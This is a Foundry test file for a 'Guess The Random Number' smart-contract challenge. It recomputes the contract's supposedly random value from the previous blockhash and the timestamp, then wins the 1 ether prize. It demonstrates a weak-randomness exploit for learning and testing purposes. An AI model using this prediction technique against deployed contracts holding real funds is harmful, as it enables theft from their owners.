
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {

    GuessTheRandomNumberChallenge challenge;

    function setUp() public {
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        assume(blockTimestamp > 0);
        assume(blockNumber > 1);
        
        // --- 2. State Configuration ---
        
        vm.deal(address(this), 2 ether);
        
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        // --- 3. Replication & Assertion ---
        
        challenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
        
        uint8 predicted = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
                
        challenge.guess{value: 1 ether}(predicted);

        assertTrue(challenge.isComplete());
    }
}
